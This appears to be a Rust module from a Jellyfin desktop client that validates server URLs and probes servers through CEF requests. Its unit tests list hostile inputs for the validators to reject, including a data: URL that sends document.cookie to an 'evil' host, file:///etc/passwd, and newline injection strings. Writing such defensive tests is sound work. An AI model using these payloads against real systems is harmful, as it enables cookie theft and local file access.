// JfnCefLayer is an opaque internal handle; callers within this crate
// pass it back unchanged. Marking each consumer unsafe would cascade
// without adding type safety, so the lint is suppressed module-wide.
#![allow(clippy::not_unsafe_ptr_arg_deref)]

//! OverlayBrowser business logic.
//!
//! The server-selection overlay loads `app://resources/overlay.html` over the
//! main browser, drives a two-phase HEAD→GET probe of user-entered server
//! URLs, and either hands input back to the main browser (dismiss) or kicks
//! the main browser into a fresh load (navigate). One process-wide instance
//! held in [`INSTANCE`]; lifetime mirrors the main browser.

use cef::*;
use parking_lot::Mutex;
use std::os::raw::c_void;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};

use crate::browsers::{jfn_browsers_create, jfn_browsers_set_active};
use crate::business_common::{apply_setting_value, reject_double_init};
use crate::client::{
    Inner, JfnCefLayer, jfn_cef_layer_create, jfn_cef_layer_inner, jfn_cef_layer_set_name,
    jfn_cef_layer_set_visible,
};
use crate::ipc::{BrowserMessage, list_opt_string, list_string, send_to_renderer};
use jfn_color::theme::jfn_theme_color_on_overlay_dismissed;
use jfn_jellyfin::{extract_base_url, is_http_url, is_valid_public_info, normalize_input};

struct OverlayState {
    main_layer: Arc<Inner>,
    active_probe: Option<Urlrequest>,
    /// Generation of the probe that owns `active_probe`; `NO_PROBE` when
    /// nothing is in flight. A completion whose generation no longer matches
    /// belongs to a cancelled or superseded attempt and is dropped.
    active_probe_id: u64,
}

/// Generation value meaning "no probe in flight".
const NO_PROBE: u64 = 0;

static NEXT_PROBE_ID: AtomicU64 = AtomicU64::new(1);

static INSTANCE: Mutex<Option<OverlayState>> = Mutex::new(None);

// ---- pure input validation ------------------------------------------------
//
// Everything the overlay page can hand the browser process goes through one of
// these first. They are pure so the rules are testable without CEF.

/// Cap on the bytes accumulated from a probe response. `/System/Info/Public`
/// is a few hundred bytes; a hostile or misconfigured server answering the
/// probe with an endless stream must not grow the browser process without
/// bound. Truncation makes the JSON unparseable, so the probe simply fails.
const PROBE_BODY_LIMIT: usize = 64 * 1024;

/// Append `data` to `body`, stopping at `cap` bytes. Returns false once the
/// cap has been reached (i.e. some bytes were dropped).
fn append_capped(body: &mut Vec<u8>, data: &[u8], cap: usize) -> bool {
    let room = cap.saturating_sub(body.len());
    if room == 0 {
        return false;
    }
    let take = room.min(data.len());
    body.extend_from_slice(&data[..take]);
    take == data.len()
}

/// The URL a `checkServerConnectivity` request should actually fetch, or
/// `None` when the input is not something this client will send a request to.
fn probe_url(user_input: &str) -> Option<String> {
    let normalized = normalize_input(user_input);
    is_http_url(&normalized).then_some(normalized)
}

/// The URL the main browser may be told to load. The main layer has the
/// native bridge injected, so only http(s) documents may ever land there.
fn navigable_url(candidate: &str) -> Option<&str> {
    is_http_url(candidate).then_some(candidate)
}

/// The URL that may be written to `settings.json` as the saved server. Empty
/// is allowed: that is how the settings page clears the saved server.
pub(crate) fn storable_server_url(candidate: &str) -> Option<&str> {
    (candidate.is_empty() || is_http_url(candidate)).then_some(candidate)
}

/// The second-phase probe URL for a resolved base.
fn system_info_url(base: &str) -> String {
    format!("{base}/System/Info/Public")
}

/// Create the overlay layer over `main_layer`, install handlers, load the
/// overlay URL. Called once after the main browser is created.
pub fn jfn_overlay_init(main_layer: *mut JfnCefLayer) {
    if main_layer.is_null() {
        return;
    }
    if reject_double_init(&INSTANCE.lock(), "jfn_overlay_init") {
        return;
    }

    let kind = c"overlay";
    let layer = unsafe { jfn_browsers_create(kind.as_ptr()) };
    if layer.is_null() {
        return;
    }

    let name = c"overlay";
    unsafe { jfn_cef_layer_set_name(layer, name.as_ptr()) };

    let inner = unsafe { jfn_cef_layer_inner(layer) };
    install_handlers(layer, Arc::clone(&inner));

    unsafe {
        jfn_cef_layer_set_visible(layer, true);
        let url = "app://resources/overlay.html";
        jfn_cef_layer_create(layer, url.as_ptr() as *const _, url.len());
    }

    let main_inner = unsafe { jfn_cef_layer_inner(main_layer) };
    *INSTANCE.lock() = Some(OverlayState {
        main_layer: main_inner,
        active_probe: None,
        active_probe_id: NO_PROBE,
    });
}

fn install_handlers(layer: *mut JfnCefLayer, inner_for_created: Arc<Inner>) {
    let l = unsafe { &*layer };

    // Created → overlay wins input.
    l.set_created_callback_rust(Some(Box::new(move |_b: *mut c_void| {
        let p = inner_for_created.layer_ptr();
        if !p.is_null() {
            jfn_browsers_set_active(p);
        }
    })));

    l.set_message_handler_rust(Some(Box::new(handle_message)));

    // BeforeClose: clear INSTANCE so post-close cancel/IPC paths no-op
    // instead of touching a torn-down main browser handle.
    l.set_before_close_callback_rust(Some(Box::new(|| {
        cancel_active_probe();
        *INSTANCE.lock() = None;
    })));

    l.set_context_menu_builder_rust(Some(crate::app_menu::build_closure()));
    l.set_context_menu_dispatcher_rust(Some(crate::app_menu::dispatch_closure()));
}

fn main_layer_arc() -> Option<Arc<Inner>> {
    INSTANCE.lock().as_ref().map(|s| Arc::clone(&s.main_layer))
}

fn handle_message(message: BrowserMessage) -> bool {
    let args = message.args();

    match message.name() {
        "getSavedServerUrl" => {
            let Some(frame) = message.main_frame() else {
                return true;
            };
            let url = jfn_config::server_url();
            send_to_renderer(&frame, "savedServerUrl", |args| {
                args.set_string(0, Some(&CefString::from(url.as_str())));
            });
            true
        }
        "navigateMain" => {
            let Some(args) = args else { return true };
            let url = list_string(args, 0);
            let Some(url) = navigable_url(&url) else {
                jfn_logging::log(
                    jfn_logging::CATEGORY_CEF,
                    jfn_logging::LEVEL_WARN,
                    &format!(
                        "Overlay: navigateMain rejected non-http(s) URL ({} bytes)",
                        url.len()
                    ),
                );
                return true;
            };
            jfn_logging::log(
                jfn_logging::CATEGORY_CEF,
                jfn_logging::LEVEL_INFO,
                &format!("Overlay: navigateMain {url}"),
            );
            jfn_config::set_server_url(url);
            jfn_config::settings_save_async();
            if let Some(ml) = main_layer_arc() {
                ml.load_url(url);
            }
            true
        }
        "dismissOverlay" => {
            jfn_logging::log(
                jfn_logging::CATEGORY_CEF,
                jfn_logging::LEVEL_INFO,
                "Overlay: dismissOverlay",
            );
            let Some(ml) = main_layer_arc() else {
                return true;
            };
            let p = ml.layer_ptr();
            if !p.is_null() {
                jfn_browsers_set_active(p);
            }
            jfn_theme_color_on_overlay_dismissed();
            true
        }
        "saveServerUrl" => {
            let Some(args) = args else { return true };
            let url = list_string(args, 0);
            let Some(url) = storable_server_url(&url) else {
                jfn_logging::log(
                    jfn_logging::CATEGORY_CEF,
                    jfn_logging::LEVEL_WARN,
                    &format!(
                        "Overlay: saveServerUrl rejected non-http(s) URL ({} bytes)",
                        url.len()
                    ),
                );
                return true;
            };
            jfn_config::set_server_url(url);
            jfn_config::settings_save_async();
            true
        }
        "setSettingValue" => {
            let Some(args) = args else { return true };
            let section = list_string(args, 0);
            let key = list_string(args, 1);
            let value = list_opt_string(args, 2);
            apply_setting_value(&section, &key, value.as_deref());
            true
        }
        "checkServerConnectivity" => {
            let Some(args) = args else { return true };
            let Some(b) = message.browser().cloned() else {
                return true;
            };
            let url = list_string(args, 0);
            cancel_active_probe();
            let Some(normalized) = probe_url(&url) else {
                // Never issue a CEF request for a scheme this client will not
                // navigate to (file:, app:, chrome:, ...). Answer the page
                // directly so its promise settles instead of hanging.
                jfn_logging::log(
                    jfn_logging::CATEGORY_CEF,
                    jfn_logging::LEVEL_WARN,
                    &format!(
                        "Overlay: checkServerConnectivity rejected non-http(s) URL ({} bytes)",
                        url.len()
                    ),
                );
                send_probe_result(&b, &url, false, &url);
                return true;
            };
            start_probe(b, url, normalized);
            true
        }
        "cancelServerConnectivity" => {
            cancel_active_probe();
            // Kill the pre-load.
            if let Some(ml) = main_layer_arc() {
                ml.reset();
            }
            true
        }
        _ => false,
    }
}

/// Cancel whatever probe is in flight and retire its generation, so a late
/// `OnRequestComplete` for it neither replies to the page nor touches the
/// slot a newer probe may already own.
fn cancel_active_probe() {
    let probe = {
        let mut guard = INSTANCE.lock();
        match guard.as_mut() {
            Some(s) => {
                s.active_probe_id = NO_PROBE;
                s.active_probe.take()
            }
            None => None,
        }
    };
    if let Some(p) = probe {
        p.cancel();
    }
}

/// True while `id` is the generation the overlay is waiting on.
fn probe_is_current(id: u64) -> bool {
    INSTANCE
        .lock()
        .as_ref()
        .is_some_and(|s| s.active_probe_id == id)
}

/// Hand the in-flight request for generation `id` to the cancel path — but
/// only while `id` is still current, so a superseded probe cannot re-arm the
/// slot or overwrite a newer probe's request.
fn store_probe_request(id: u64, request: Urlrequest) {
    if let Some(s) = INSTANCE.lock().as_mut()
        && s.active_probe_id == id
    {
        s.active_probe = Some(request);
    }
}

/// Retire generation `id` once it has produced a result, so a later
/// `cancel()` is a no-op rather than aborting somebody else's request.
fn finish_probe(id: u64) {
    if let Some(s) = INSTANCE.lock().as_mut()
        && s.active_probe_id == id
    {
        s.active_probe_id = NO_PROBE;
        s.active_probe = None;
    }
}

fn send_probe_result(browser: &Browser, user_url: &str, success: bool, reply_url: &str) {
    let Some(frame) = browser.main_frame() else {
        return;
    };
    send_to_renderer(&frame, "serverConnectivityResult", |args| {
        args.set_string(0, Some(&CefString::from(user_url)));
        args.set_bool(1, i32::from(success));
        args.set_string(2, Some(&CefString::from(reply_url)));
    });
}

fn start_probe(browser: Browser, user_url: String, normalized: String) {
    let probe = ServerProbeClient::new(
        normalized,
        Box::new(move |success, base_url| {
            let reply_url = if success { &base_url } else { &user_url };
            send_probe_result(&browser, &user_url, success, reply_url);
        }),
    );
    probe.start();
}

// ---- ServerProbeClient ----------------------------------------------------
//
// HEAD with redirect-follow to find the canonical base URL, then GET
// {base}/System/Info/Public to confirm it's a Jellyfin server. Cancellable:
// .cancel() aborts the active CefURLRequest; a late OnRequestComplete with
// the slot cleared is harmless.

type ProbeCallback = Box<dyn FnMut(bool, String) + Send + Sync>;

struct ProbeState {
    id: u64,
    url: String,
    phase: Phase,
    base: String,
    body: Vec<u8>,
    callback: Option<ProbeCallback>,
}

#[derive(Copy, Clone, PartialEq)]
enum Phase {
    Head,
    Get,
}

struct ServerProbeClient {
    state: Arc<Mutex<ProbeState>>,
}

impl ServerProbeClient {
    fn new(url: String, callback: ProbeCallback) -> Self {
        Self {
            state: Arc::new(Mutex::new(ProbeState {
                id: NEXT_PROBE_ID.fetch_add(1, Ordering::Relaxed),
                url,
                phase: Phase::Head,
                base: String::new(),
                body: Vec::new(),
                callback: Some(callback),
            })),
        }
    }

    fn start(&self) {
        let (url, id) = {
            let st = self.state.lock();
            (st.url.clone(), st.id)
        };
        // Claim the generation before the request exists: OnRequestComplete
        // must never run against a slot that still says NO_PROBE.
        if let Some(s) = INSTANCE.lock().as_mut() {
            s.active_probe_id = id;
            s.active_probe = None;
        }
        match make_request("HEAD", &url, self.client()) {
            Some(r) => store_probe_request(id, r),
            None => finish_probe(id),
        }
    }

    fn client(&self) -> UrlrequestClient {
        JfnServerProbeClient::new(Arc::clone(&self.state))
    }
}

fn on_complete(state: &Arc<Mutex<ProbeState>>, request: &Urlrequest) {
    let id = state.lock().id;
    // Cancelled, or superseded by a newer connect attempt: drop the result
    // rather than reply for a URL nobody is waiting on (and, worse, clear the
    // slot that now belongs to the newer probe).
    if !probe_is_current(id) {
        return;
    }

    // HEAD phase: extract resolved base URL, post GET on /System/Info/Public.
    let next_request = {
        let mut st = state.lock();
        if st.phase == Phase::Head {
            let mut resolved = st.url.clone();
            if let Some(resp) = request.response() {
                let url_uf = resp.url();
                let cs: CefString = (&url_uf).into();
                let s = cs.to_string();
                // A redirect chain decides this URL, so re-apply the scheme
                // gate before it becomes the base we fetch and hand back.
                if is_http_url(&s) {
                    resolved = s;
                }
            }
            st.base = extract_base_url(&resolved).to_string();
            st.phase = Phase::Get;
            let next_url = system_info_url(&st.base);
            let client = JfnServerProbeClient::new(Arc::clone(state));
            make_request("GET", &next_url, client)
        } else {
            None
        }
    };
    if let Some(r) = next_request {
        // Register the GET too: without it, a cancel arriving during the
        // second phase had nothing to abort.
        store_probe_request(id, r);
        return;
    }

    // GET phase complete: validate body, then invoke caller.
    let (success, base, cb) = {
        let mut st = state.lock();
        let mut ok = false;
        let status = request.request_status();
        if status.as_ref() == &sys::cef_urlrequest_status_t::UR_SUCCESS
            && let Some(resp) = request.response()
            && resp.status() == 200
        {
            ok = is_valid_public_info(&st.body);
        }
        let base = st.base.clone();
        let cb = st.callback.take();
        (ok, base, cb)
    };
    // Retire the generation before replying, so a cancel() racing the reply
    // is a no-op instead of aborting an already-finished request.
    finish_probe(id);
    if let Some(mut f) = cb {
        f(success, base);
    }
}

fn make_request(method: &str, url: &str, client: UrlrequestClient) -> Option<Urlrequest> {
    let req: Request = request_create()?;
    req.set_url(Some(&CefString::from(url)));
    req.set_method(Some(&CefString::from(method)));
    let mut req_arg = req;
    let mut client_arg = client;
    urlrequest_create(Some(&mut req_arg), Some(&mut client_arg), None)
}

cef::wrap_urlrequest_client! {
    struct JfnServerProbeClient {
        state: Arc<Mutex<ProbeState>>,
    }

    impl UrlrequestClient {
        fn on_request_complete(&self, request: Option<&mut Urlrequest>) {
            let Some(req) = request else { return };
            on_complete(&self.state, req);
        }
        fn on_download_data(
            &self,
            _request: Option<&mut Urlrequest>,
            data: *const u8,
            data_length: usize,
        ) {
            let mut st = self.state.lock();
            if st.phase == Phase::Get && !data.is_null() && data_length > 0 {
                let slice = unsafe { std::slice::from_raw_parts(data, data_length) };
                append_capped(&mut st.body, slice, PROBE_BODY_LIMIT);
            }
        }
    }
}

// ---- tests ----
//
// Only the pure input rules are covered here; the CEF-bound halves
// (`jfn_overlay_init`, `handle_message`, `on_complete`) need a live browser
// and are exercised by the E2E suite.

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn probe_url_normalizes_a_plain_host() {
        assert_eq!(probe_url("example.com"), Some("http://example.com".into()));
        assert_eq!(
            probe_url("  HTTPS://example.com:8096/web/index.html "),
            Some("https://example.com:8096/web/index.html".into())
        );
        assert_eq!(probe_url("[::1]:8096"), Some("http://[::1]:8096".into()));
    }

    #[test]
    fn probe_url_refuses_every_scheme_but_http_and_https() {
        // The probe is a CEF URL request issued by the browser process: a
        // `file:` or `app:` target would read local/app resources on behalf
        // of whatever the overlay page asked for.
        for hostile in [
            "file:///C:/Windows/win.ini",
            "FILE://///attacker/share/x",
            "app://resources/overlay.html",
            "chrome://settings",
            "devtools://devtools/bundled/inspector.html",
            "blob://x",
        ] {
            assert_eq!(probe_url(hostile), None, "input {hostile:?}");
        }
        // Degenerate input never produces a request either.
        assert_eq!(probe_url(""), None);
        assert_eq!(probe_url("   "), None);
        assert_eq!(probe_url("://"), None);
    }

    #[test]
    fn navigable_url_gates_the_main_layer_to_http() {
        assert_eq!(
            navigable_url("https://host/jellyfin/"),
            Some("https://host/jellyfin/")
        );
        for hostile in [
            "file:///C:/Users/x/Desktop/evil.html",
            "app://resources/overlay.html",
            "chrome://version",
            "javascript:alert(1)",
            "data:text/html,<script>fetch('http://evil/'+document.cookie)</script>",
            "",
        ] {
            assert_eq!(navigable_url(hostile), None, "input {hostile:?}");
        }
    }

    #[test]
    fn navigable_url_rejects_a_newline_that_would_forge_a_log_line() {
        // `navigateMain` logs the URL verbatim.
        assert_eq!(
            navigable_url("http://host/\nERROR   [Main] wiped the disk"),
            None
        );
        assert_eq!(navigable_url("http://host/\r\nX-Injected: 1"), None);
    }

    #[test]
    fn storable_server_url_allows_the_empty_clearing_value() {
        // client-settings.js calls saveServerUrl('') to forget the server.
        assert_eq!(storable_server_url(""), Some(""));
        assert_eq!(storable_server_url("http://host"), Some("http://host"));
        assert_eq!(storable_server_url("file:///etc/passwd"), None);
        assert_eq!(storable_server_url("app://resources/overlay.html"), None);
    }

    #[test]
    fn system_info_url_appends_the_probe_path() {
        assert_eq!(
            system_info_url("https://host:8096/jellyfin"),
            "https://host:8096/jellyfin/System/Info/Public"
        );
        assert_eq!(
            system_info_url("http://host"),
            "http://host/System/Info/Public"
        );
    }

    #[test]
    fn append_capped_stops_at_the_limit() {
        let mut body = Vec::new();
        assert!(append_capped(&mut body, b"abc", 8));
        assert!(append_capped(&mut body, b"defgh", 8));
        assert_eq!(body, b"abcdefgh");
        // Full: further chunks are dropped and the caller is told so.
        assert!(!append_capped(&mut body, b"ijk", 8));
        assert_eq!(body.len(), 8);
    }

    #[test]
    fn append_capped_truncates_a_chunk_that_straddles_the_limit() {
        let mut body = Vec::new();
        assert!(!append_capped(&mut body, b"abcdefghij", 4));
        assert_eq!(body, b"abcd");
    }

    #[test]
    fn append_capped_bounds_an_endless_hostile_body() {
        // A server that answers /System/Info/Public with a never-ending
        // stream must not grow the browser process without bound.
        let mut body = Vec::new();
        let chunk = vec![b'A'; 8 * 1024];
        for _ in 0..4096 {
            append_capped(&mut body, &chunk, PROBE_BODY_LIMIT);
        }
        assert_eq!(body.len(), PROBE_BODY_LIMIT);
        // And the truncated body is not mistaken for a valid server answer.
        assert!(!is_valid_public_info(&body));
    }

    #[test]
    fn append_capped_handles_a_zero_cap_and_an_empty_chunk() {
        let mut body = Vec::new();
        assert!(!append_capped(&mut body, b"a", 0));
        assert!(body.is_empty());
        assert!(append_capped(&mut body, b"", 4));
        assert!(body.is_empty());
    }
}
